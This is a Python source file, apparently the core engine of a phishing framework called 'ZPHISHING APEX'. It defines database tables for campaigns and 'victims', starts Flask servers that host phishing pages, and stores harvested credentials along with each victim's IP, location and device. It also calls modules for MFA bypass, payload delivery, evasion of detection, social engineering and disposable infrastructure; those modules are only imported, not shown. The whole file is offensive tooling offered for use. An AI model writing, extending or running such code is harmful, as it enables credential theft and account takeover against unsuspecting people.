#!/usr/bin/env python3
"""
ZPHISHING APEX — Core Engine
"""

import os
import sys
import json
import time
import hashlib
import sqlite3
import threading
import subprocess
import asyncio
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from enum import Enum, auto
from functools import wraps

from flask import Flask, request, render_template_string, redirect, session, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import Column, Integer, String, Text, DateTime, Boolean, ForeignKey, JSON
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import relationship, sessionmaker

from core.ai_engine import AIEngine
from core.blockchain import BlockchainVerifier
from core.quantum_crypto import QuantumCrypto
from core.distributed import DistributedInfrastructure

from modules.reconnaissance import ReconnaissanceModule
from modules.template_engine import TemplateEngine
from modules.credential_harvester import CredentialHarvester
from modules.evasion import EvasionEngine
from modules.payload_delivery import PayloadDelivery
from modules.mfa_bypass import MFABypass
from modules.social_engineering import SocialEngineering
from modules.infrastructure import InfrastructureManager
from modules.analytics import AnalyticsEngine

from utils.logger import setup_logger
from utils.config_manager import ConfigManager
from utils.crypto_utils import CryptoUtils
from utils.helpers import Helpers

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    id = Column(String, primary_key=True)
    username = Column(String, unique=True, nullable=False)
    email = Column(String, unique=True, nullable=False)
    password_hash = Column(String, nullable=False)
    role = Column(String, default='operator')
    created_at = Column(DateTime, default=datetime.utcnow)
    last_login = Column(DateTime)
    is_active = Column(Boolean, default=True)

class Campaign(Base):
    __tablename__ = 'campaigns'
    id = Column(String, primary_key=True)
    name = Column(String, nullable=False)
    template = Column(String, nullable=False)
    target_url = Column(String)
    redirect_url = Column(String)
    port = Column(Integer, default=8080)
    ssl = Column(Boolean, default=False)
    domain = Column(String)
    status = Column(String, default='created')
    created_at = Column(DateTime, default=datetime.utcnow)
    started_at = Column(DateTime)
    stopped_at = Column(DateTime)
    victims_count = Column(Integer, default=0)
    config = Column(JSON)
    created_by = Column(String, ForeignKey('users.id'))

class Victim(Base):
    __tablename__ = 'victims'
    id = Column(String, primary_key=True)
    campaign_id = Column(String, ForeignKey('campaigns.id'))
    ip = Column(String)
    user_agent = Column(String)
    credentials = Column(JSON)
    timestamp = Column(DateTime, default=datetime.utcnow)
    location = Column(String)
    device = Column(String)
    browser = Column(String)
    os = Column(String)
    verified = Column(Boolean, default=False)
    blockchain_hash = Column(String)
    encrypted_data = Column(Text)

class Template(Base):
    __tablename__ = 'templates'
    id = Column(String, primary_key=True)
    name = Column(String, unique=True, nullable=False)
    platform = Column(String)
    html = Column(Text)
    created_at = Column(DateTime, default=datetime.utcnow)
    usage_count = Column(Integer, default=0)
    ai_generated = Column(Boolean, default=False)
    config = Column(JSON)

class Infrastructure(Base):
    __tablename__ = 'infrastructure'
    id = Column(String, primary_key=True)
    provider = Column(String)
    instance_id = Column(String)
    ip = Column(String)
    status = Column(String, default='running')
    created_at = Column(DateTime, default=datetime.utcnow)
    destroyed_at = Column(DateTime)
    config = Column(JSON)

class ZPhishingEngine:
    def __init__(self, app: Flask, db: SQLAlchemy, socketio: SocketIO):
        self.app = app
        self.db = db
        self.socketio = socketio
        self.logger = setup_logger('zphishing')
        self.config = ConfigManager()
        self.crypto = CryptoUtils()
        self.helpers = Helpers()

        # Initialize modules
        self.ai = AIEngine()
        self.blockchain = BlockchainVerifier()
        self.quantum = QuantumCrypto()
        self.distributed = DistributedInfrastructure()
        self.recon = ReconnaissanceModule()
        self.templates = TemplateEngine(db)
        self.harvester = CredentialHarvester(db, self.crypto)
        self.evasion = EvasionEngine()
        self.payloads = PayloadDelivery()
        self.mfa = MFABypass()
        self.social = SocialEngineering()
        self.infrastructure = InfrastructureManager()
        self.analytics = AnalyticsEngine(db)

        self.active_campaigns = {}
        self.campaign_threads = {}

    def create_campaign(self, data: Dict) -> str:
        """Create a new campaign"""
        campaign_id = hashlib.md5(
            f"{data['name']}{time.time()}".encode()
        ).hexdigest()[:12]

        campaign = Campaign(
            id=campaign_id,
            name=data['name'],
            template=data['template'],
            target_url=data.get('target_url', ''),
            redirect_url=data.get('redirect_url', 'https://www.google.com'),
            port=data.get('port', 8080),
            ssl=data.get('ssl', False),
            domain=data.get('domain', ''),
            status='created',
            config=data.get('config', {})
        )

        self.db.session.add(campaign)
        self.db.session.commit()

        self.logger.info(f"Campaign created: {campaign_id}")
        return campaign_id

    def list_campaigns(self) -> List[Dict]:
        """List all campaigns"""
        campaigns = Campaign.query.all()
        return [{
            'id': c.id,
            'name': c.name,
            'template': c.template,
            'status': c.status,
            'victims': c.victims_count,
            'created_at': c.created_at.isoformat() if c.created_at else None
        } for c in campaigns]

    def get_campaign(self, campaign_id: str) -> Optional[Dict]:
        """Get campaign details"""
        campaign = Campaign.query.get(campaign_id)
        if campaign:
            return {
                'id': campaign.id,
                'name': campaign.name,
                'template': campaign.template,
                'status': campaign.status,
                'victims': campaign.victims_count,
                'config': campaign.config
            }
        return None

    def update_campaign(self, campaign_id: str, data: Dict):
        """Update campaign"""
        campaign = Campaign.query.get(campaign_id)
        if campaign:
            for key, value in data.items():
                setattr(campaign, key, value)
            self.db.session.commit()

    def delete_campaign(self, campaign_id: str):
        """Delete campaign"""
        campaign = Campaign.query.get(campaign_id)
        if campaign:
            self.db.session.delete(campaign)
            self.db.session.commit()

    def start_campaign(self, campaign_id: str) -> bool:
        """Start a campaign"""
        campaign = Campaign.query.get(campaign_id)
        if not campaign:
            return False

        campaign.status = 'active'
        campaign.started_at = datetime.utcnow()
        self.db.session.commit()

        # Start server thread
        def run_server():
            with self.app.app_context():
                self.app.run(
                    host='0.0.0.0',
                    port=campaign.port,
                    ssl_context='adhoc' if campaign.ssl else None,
                    debug=False,
                    use_reloader=False
                )

        thread = threading.Thread(target=run_server, daemon=True)
        thread.start()

        self.active_campaigns[campaign_id] = campaign
        self.campaign_threads[campaign_id] = thread

        self.logger.info(f"Campaign started: {campaign_id}")
        return True

    def stop_campaign(self, campaign_id: str):
        """Stop a campaign"""
        campaign = Campaign.query.get(campaign_id)
        if campaign:
            campaign.status = 'stopped'
            campaign.stopped_at = datetime.utcnow()
            self.db.session.commit()

            if campaign_id in self.active_campaigns:
                del self.active_campaigns[campaign_id]

    def capture_credentials(self, campaign_id: str, data: Dict, request_info: Dict) -> str:
        """Capture credentials from victim"""
        victim_id = hashlib.md5(
            f"{campaign_id}{data.get('email', 'unknown')}{time.time()}".encode()
        ).hexdigest()[:12]

        # Encrypt sensitive data
        encrypted_data = self.quantum.encrypt(json.dumps(data))

        # Blockchain verification
        blockchain_hash = self.blockchain.hash_data(data)

        # Get location info
        location = self.helpers.get_location(request_info['ip'])

        # Parse device info
        device_info = self.helpers.parse_user_agent(request_info['user_agent'])

        victim = Victim(
            id=victim_id,
            campaign_id=campaign_id,
            ip=request_info['ip'],
            user_agent=request_info['user_agent'],
            credentials=data,
            location=location,
            device=device_info['device'],
            browser=device_info['browser'],
            os=device_info['os'],
            blockchain_hash=blockchain_hash,
            encrypted_data=encrypted_data
        )

        self.db.session.add(victim)

        # Update campaign victim count
        campaign = Campaign.query.get(campaign_id)
        if campaign:
            campaign.victims_count += 1

        self.db.session.commit()

        self.logger.info(f"Victim captured: {victim_id}")
        return victim_id

    def get_victims(self, campaign_id: Optional[str] = None) -> List[Dict]:
        """Get victims"""
        query = Victim.query
        if campaign_id:
            query = query.filter_by(campaign_id=campaign_id)

        victims = query.order_by(Victim.timestamp.desc()).all()
        return [{
            'id': v.id,
            'campaign_id': v.campaign_id,
            'ip': v.ip,
            'credentials': v.credentials,
            'timestamp': v.timestamp.isoformat() if v.timestamp else None,
            'location': v.location,
            'device': v.device,
            'verified': v.verified
        } for v in victims]

    def get_redirect_url(self, campaign_id: str) -> str:
        """Get redirect URL for campaign"""
        campaign = Campaign.query.get(campaign_id)
        if campaign:
            return campaign.redirect_url
        return 'https://www.google.com'

    def check_evasion(self, request_info: Dict) -> bool:
        """Check if request should be evaded"""
        return self.evasion.should_evade(request_info)

    def ai_generate_template(self, data: Dict) -> Dict:
        """Generate template using AI"""
        return self.ai.generate_template(data)

    def blockchain_verify_credentials(self, data: Dict) -> Dict:
        """Verify credentials using blockchain"""
        return self.blockchain.verify(data)

    def quantum_encrypt(self, data: Dict) -> Dict:
        """Encrypt data using quantum-resistant crypto"""
        return {'encrypted': self.quantum.encrypt(json.dumps(data))}

    def distributed_deploy(self, data: Dict) -> Dict:
        """Deploy distributed infrastructure"""
        return self.distributed.deploy(data)

    def mfa_bypass(self, data: Dict) -> Dict:
        """Attempt MFA bypass"""
        return self.mfa.bypass(data)

    def deliver_payload(self, data: Dict) -> Dict:
        """Deliver payload to victim"""
        return self.payloads.deliver(data)

    def recon_target(self, data: Dict) -> Dict:
        """Perform reconnaissance on target"""
        return self.recon.scan(data)

    def social_engineer(self, data: Dict) -> Dict:
        """Execute social engineering attack"""
        return self.social.engage(data)

    def spin_infrastructure(self, data: Dict) -> Dict:
        """Spin up infrastructure"""
        return self.infrastructure.spin(data)

    def destroy_infrastructure(self, data: Dict) -> Dict:
        """Destroy infrastructure"""
        return self.infrastructure.destroy(data)

    def get_analytics(self) -> Dict:
        """Get analytics data"""
        return self.analytics.get_stats()

    def authenticate(self, data: Dict) -> Dict:
        """Authenticate user"""
        user = User.query.filter_by(username=data['username']).first()
        if user and self.crypto.verify_password(data['password'], user.password_hash):
            return {'success': True, 'user_id': user.id}
        return {'success': False}

    def register_user(self, data: Dict) -> Dict:
        """Register new user"""
        user_id = hashlib.md5(f"{data['username']}{time.time()}".encode()).hexdigest()[:12]

        user = User(
            id=user_id,
            username=data['username'],
            email=data['email'],
            password_hash=self.crypto.hash_password(data['password']),
            role=data.get('role', 'operator')
        )

        self.db.session.add(user)
        self.db.session.commit()

        return {'success': True, 'user_id': user_id}

    def create_user(self, username: str, password: str, email: str, role: str = 'operator'):
        """Create user (CLI)"""
        user_id = hashlib.md5(f"{username}{time.time()}".encode()).hexdigest()[:12]

        user = User(
            id=user_id,
            username=username,
            email=email,
            password_hash=self.crypto.hash_password(password),
            role=role
        )

        self.db.session.add(user)
        self.db.session.commit()

    def list_templates(self) -> List[Dict]:
        """List all templates"""
        return self.templates.list_templates()

    def create_template(self, data: Dict) -> str:
        """Create new template"""
        return self.templates.create(data)
